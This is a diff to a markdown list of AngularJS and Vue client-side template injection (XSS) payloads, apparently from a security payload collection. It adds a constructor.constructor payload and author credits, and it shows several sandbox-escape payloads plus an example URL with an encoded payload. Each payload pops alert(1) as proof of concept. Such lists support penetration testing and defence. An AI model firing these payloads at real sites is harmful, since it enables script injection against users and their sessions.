@@ -1,5 +1,13 @@
 # XSS in Angular
 
+> Angular as of version 1.6 have removed the sandbox altogether
+
+Angular 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
+
+```javascript
+{{constructor.constructor('alert(1)')()}}
+```
+
 Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)
 
 ```javascript
@@ -8,7 +16,7 @@ Angular 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/103153474608
 
 Example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)
 
-Angular 1.6.0 [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
+Angular 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)
 
 ```javascript
 {{0[a='constructor'][a]('alert(1)')()}}
@@ -16,7 +24,7 @@ Angular 1.6.0 [@LewisArdern](https://twitter.com/LewisArdern/status/105588761961
 {{$on.constructor('alert(1)')()}}
 ```
 
-Angular 1.5.9
+Angular 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)
 
 ```javascript
 {{
@@ -140,3 +148,7 @@ Vue JS
 ```javascript
 {{constructor.constructor('alert(1)')()}}
 ```
+
+## Thanks
+
+- [](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
